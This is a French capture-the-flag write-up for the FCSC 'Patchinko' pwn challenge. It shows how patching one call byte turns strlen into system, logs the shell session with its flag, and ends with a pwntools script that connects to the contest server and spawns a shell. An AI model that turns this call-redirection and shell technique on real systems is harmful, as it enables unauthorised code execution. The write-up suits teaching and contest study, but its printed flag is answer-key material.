# Patchinko - PWN - 200

> Venez tester la nouvelle version de machine de jeu Patchinko ! Les chances de victoire étant proches de zéro, nous aidons les joueurs. 
> Prouvez qu'il est possible de compromettre le système pour lire le fichier flag.

## Fonctionnement du service

En se connectant au service donné, il nous est gracieusement proposé de patcher un octet du binaire **avant son lancement**.

Nous devons donc tirer profit de ce cadeau du ciel en modifiant un octet nous permettant de lire le flag!

## Analyse du binaire

Le binaire n'est pas très compliqué, il nous demande dans un premier temps notre nom, puis génère 1 nombre aléatoire qu'on doit ensuite deviner ...

On remarque également la présence de **system** qui est suspecte. Elle est utilisée dans le binaire pour afficher un simple message.

Il faudrait donc remplacer le call d'une fonction prenant en premier paramètre une chaîne que l'on contrôle par system, ce qui nous permettra d'éxecuter une commande sur le service !

Prenons par exemple strlen, qui est un parfait candidat pour ce que nous recherchons !

## Altération du flux d'exécution

Avec objdump, nous récupérons les deux instructions de call vers system et strlen:

```
400853:	e8 78 fe ff ff       	call   4006d0 <system@plt>
400888:	e8 33 fe ff ff       	call   4006c0 <strlen@plt>
```

Un seul octet varie entre les deux !
Nous devons donc modifier l'octet à 0x400889 par la valeur 0x78, ce qui appelera system à la place de strlen lors de l'exécution !

Cependant, dans le fichier, il n'y a pas l'adresse de base, l'offset réel est donc 0x889.

Mais pas si vite ... Le call est relatif et se base sur la valeur de RIP, nous devons donc déduire de cette valeur la différence entre les deux instructions, ce qui nous donne: ```0x78 - (0x400888 - 400853) = 0x43.```

## Récupération du flag

Il nous suffit donc d'indiquer au service de modifier l'octet à l'offset 0x889 par 0x78, puis de taper /bin/sh pour avoir un shell !
Seulement, dans le binaire la taille de l'entrée est limitée à 4 caractères, nous ne pouvons pas rentrer /bin/sh ...

Mais system se base sur le PATH, nous pouvons donc raccourcir notre /bin/sh à un simple sh !

```
At which position do you want to modify (base 16)?
>>> 0x889
Which byte value do you want to write there (base 16)?
>>> 0x43
== Let's go!
Hello! Welcome to Patchinko Gambling Machine.
Is this your first time here? [y/n]
>>> sh
id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
cat flag
FCSC{b4cbc07a77bb0984b994c9e34b2897ab49f08524402c38621a38bc4475102998}
``` 

Boom, on a le flag !

FLAG: FCSC{b4cbc07a77bb0984b994c9e34b2897ab49f08524402c38621a38bc4475102998}

Niveau automatisation c'est pas ouf, on doit quand même écrire des trucs pour obtenir un shell ...
Un petit script ça ferait pas de mal !

```py
#!/usr/bin/python

from pwn import *

where = 0x0889
what = 0x43

r = remote('challenges1.france-cybersecurity-challenge.fr', 4009)

r.recv()

r.sendline(hex(where))
r.recv()

r.sendline(hex(what))
r.recv()

r.sendline("sh")
r.interactive()
```